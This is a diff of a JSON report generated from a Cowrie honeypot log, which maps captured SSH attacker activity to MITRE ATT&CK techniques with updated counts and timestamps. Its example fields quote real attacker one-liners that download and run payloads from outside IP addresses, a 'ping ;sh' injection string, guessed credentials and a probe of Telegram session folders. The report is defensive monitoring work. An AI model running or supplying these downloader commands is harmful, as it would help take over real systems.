@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-21 22:03:45",
+  "generated": "2026-08-21 23:01:12",
   "totals": {
-    "commands": 622,
-    "login_failed": 8175,
-    "login_success": 107,
-    "sessions": 5740
+    "commands": 673,
+    "login_failed": 8637,
+    "login_success": 112,
+    "sessions": 6182
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 8175,
+      "count": 8637,
       "examples": [
         "odoo / P@ssw0rd",
         "sh\\x00 / /bin/busybox UNSTABLE\\x00",
@@ -21,14 +21,14 @@
         "root / root123."
       ],
       "first": "2026-08-21T00:00:05.590428Z",
-      "last": "2026-08-21T22:03:44.355917Z",
-      "unique_ips": 91
+      "last": "2026-08-21T23:00:28.124377Z",
+      "unique_ips": 94
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 154,
+      "count": 169,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -37,14 +37,14 @@
         ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-08-21T01:04:57.795191Z",
-      "last": "2026-08-21T21:36:54.839799Z",
-      "unique_ips": 22
+      "last": "2026-08-21T22:17:07.069532Z",
+      "unique_ips": 23
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 107,
+      "count": 112,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / xirtam",
@@ -53,14 +53,14 @@
         "root / root"
       ],
       "first": "2026-08-21T00:25:45.541215Z",
-      "last": "2026-08-21T21:40:43.398666Z",
-      "unique_ips": 72
+      "last": "2026-08-21T22:58:43.299980Z",
+      "unique_ips": 75
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 106,
+      "count": 110,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -69,14 +69,14 @@
         "http://185.93.89.72/wget"
       ],
       "first": "2026-08-21T01:04:57.795191Z",
-      "last": "2026-08-21T21:41:02.473579Z",
-      "unique_ips": 23
+      "last": "2026-08-21T22:17:07.069532Z",
+      "unique_ips": 24
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 24,
+      "count": 26,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
@@ -85,22 +85,22 @@
         "grep processor /proc/cpuinfo|grep -v Duo|wc -l"
       ],
       "first": "2026-08-21T05:12:14.278101Z",
-      "last": "2026-08-21T21:07:15.408274Z",
-      "unique_ips": 17
+      "last": "2026-08-21T22:28:36.439575Z",
+      "unique_ips": 18
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 12,
+      "count": 13,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "id",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-21T01:31:58.535359Z",
-      "last": "2026-08-21T21:20:43.576379Z",
-      "unique_ips": 11
+      "last": "2026-08-21T22:15:59.617351Z",
+      "unique_ips": 12
     },
     {
       "id": "T1059.004",
@@ -131,16 +131,41 @@
       "unique_ips": 3
     },
     {
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 4,
+      "examples": [
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'"
+      ],
+      "first": "2026-08-21T15:54:37.255897Z",
+      "last": "2026-08-21T22:28:37.686743Z",
+      "unique_ips": 2
+    },
+    {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 4,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
       ],
       "first": "2026-08-21T06:49:33.351090Z",
-      "last": "2026-08-21T21:07:15.408274Z",
+      "last": "2026-08-21T22:28:38.308117Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "ifconfig"
+      ],
+      "first": "2026-08-21T15:54:35.210827Z",
+      "last": "2026-08-21T22:28:35.210462Z",
       "unique_ips": 2
     },
     {
@@ -153,19 +178,6 @@
       ],
       "first": "2026-08-21T06:49:33.351090Z",
       "last": "2026-08-21T21:07:15.408274Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1057",
-      "name": "Process Discovery",
-      "tactic": "Discovery",
-      "count": 2,
-      "examples": [
-        "ps | grep '[Mm]iner'",
-        "ps -ef | grep '[Mm]iner'"
-      ],
-      "first": "2026-08-21T15:54:37.255897Z",
-      "last": "2026-08-21T15:54:37.939901Z",
       "unique_ips": 1
     },
     {
@@ -190,18 +202,6 @@
       ],
       "first": "2026-08-21T06:49:33.351090Z",
       "last": "2026-08-21T21:07:15.408274Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1016",
-      "name": "System Network Configuration Discovery",
-      "tactic": "Discovery",
-      "count": 1,
-      "examples": [
-        "ifconfig"
-      ],
-      "first": "2026-08-21T15:54:35.210827Z",
-      "last": "2026-08-21T15:54:35.210827Z",
       "unique_ips": 1
     },
     {
@@ -232,47 +232,47 @@
   "unmapped": [
     [
       "/bin/busybox",
-      63
+      75
     ],
     [
       "sh",
-      41
+      43
     ],
     [
       "system",
-      37
+      39
     ],
     [
       "shell",
-      37
+      39
     ],
     [
       "enable",
-      35
+      37
     ],
     [
       "linuxshell",
-      26
+      28
     ],
     [
       "cd /proc && cat self/cmdline",
-      15
+      16
     ],
     [
       "/bin/busybox UNSTABLE",
-      14
+      15
     ],
     [
       "ping ;sh",
+      15
+    ],
+    [
+      "enablelinuxshell",
       14
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       14
-    ],
-    [
-      "enablelinuxshell",
-      13
     ],
     [
       "zalee",
@@ -288,7 +288,7 @@
     ],
     [
       "busybox",
-      8
+      9
     ],
     [
       "ping; sh",
